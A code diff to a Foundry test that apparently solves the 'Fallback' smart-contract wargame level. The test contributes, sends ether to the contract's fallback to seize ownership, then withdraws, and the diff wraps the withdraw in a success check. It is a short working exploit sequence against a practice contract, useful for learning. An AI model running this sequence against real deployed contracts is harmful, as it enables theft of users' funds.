@@ -19,8 +19,10 @@ contract FallbackTest is Test {
 
         vm.startPrank(attacker);
         fallBack.contribute{value: 0.0001 ether}();
-        address(fallBack).call{value: 0.0001 ether}("");
-        fallBack.withdraw();
+        (bool success, ) = address(fallBack).call{value: 0.0001 ether}("");
+        if (success) {
+            fallBack.withdraw();
+        }
         vm.stopPrank();
 
         assertEq(fallBack.owner(), attacker, "Attacker should be the owner");
